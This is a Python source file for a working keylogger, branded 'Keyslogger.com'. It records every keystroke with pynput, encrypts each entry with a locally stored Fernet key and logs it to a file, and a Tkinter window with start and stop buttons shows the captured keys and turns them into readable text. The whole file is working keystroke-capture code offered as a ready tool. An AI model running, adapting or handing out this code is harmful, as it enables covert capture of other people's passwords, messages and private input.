from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import tkinter as tk
from tkinter import scrolledtext, messagebox
import logging
import os

# Encryption Setup
def load_or_generate_key():
    if not os.path.exists("key.key"):
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    return key

key = load_or_generate_key()
cipher_suite = Fernet(key)

# Setting up logging to store encrypted keystrokes in a file
log_file = "encryptedkeyslogger.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

def encrypt_log(log_entry):
    encrypted_data = cipher_suite.encrypt(log_entry.encode())
    return encrypted_data

# Keylogging function that also updates the GUI in real-time
def on_press(key):
    try:
        log_data = str(key.char)
    except AttributeError:
        log_data = str(key)
    encrypted_log = encrypt_log(log_data)
    logging.info(encrypted_log.decode())

    # Display the keystrokes in real-time in the GUI text box
    log_display.insert(tk.END, log_data)
    log_display.see(tk.END)  # Scroll to the end to show the latest entry

# Global listener variable to start and stop
listener = None

# GUI Functions
def start_keylogger():
    global listener
    if listener is None or not listener.running:  # Prevent multiple listeners
        listener = Listener(on_press=on_press)
        listener.start()
        messagebox.showinfo("Keylogger", "Keylogger started.")
    else:
        messagebox.showwarning("Warning", "Keylogger is already running.")

def stop_keylogger():
    global listener
    if listener and listener.running:
        listener.stop()
        listener.join()
        messagebox.showinfo("Keylogger", "Keylogger stopped.")
    else:
        messagebox.showwarning("Warning", "Keylogger is not running.")

def convert_to_readable():
    # Get the current text in the log_display
    raw_text = log_display.get("1.0", tk.END)

    # Replace special keys with readable format
    readable_text = raw_text.replace("Key.space", " ").replace("Key.backspace", "[BACKSPACE]").replace("Key.enter", "\n").replace("Key.caps_lock", "[CAPS_LOCK]")
    readable_text = readable_text.replace("Key.tab", "\t").replace("Key.shift", "[SHIFT]").replace("Key.ctrl", "[CTRL]")  # Add more replacements as needed

    # Display the readable text in the readable_text_display
    readable_text_display.delete("1.0", tk.END)
    readable_text_display.insert(tk.END, readable_text)

# Set up the GUI with Tkinter
root = tk.Tk()
root.title("Made with ❤️ by Keyslogger.com")
root.geometry("500x600")

# Start/Stop Buttons
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

# Text area to display encrypted keystrokes
log_display = scrolledtext.ScrolledText(root, width=50, height=10)
log_display.pack(pady=10)

# Button to convert to readable format
convert_button = tk.Button(root, text="Convert to Readable Format", command=convert_to_readable)
convert_button.pack(pady=10)

# Text area to display readable keystrokes
readable_text_display = scrolledtext.ScrolledText(root, width=50, height=10)
readable_text_display.pack(pady=10)

# Run the GUI
root.mainloop()
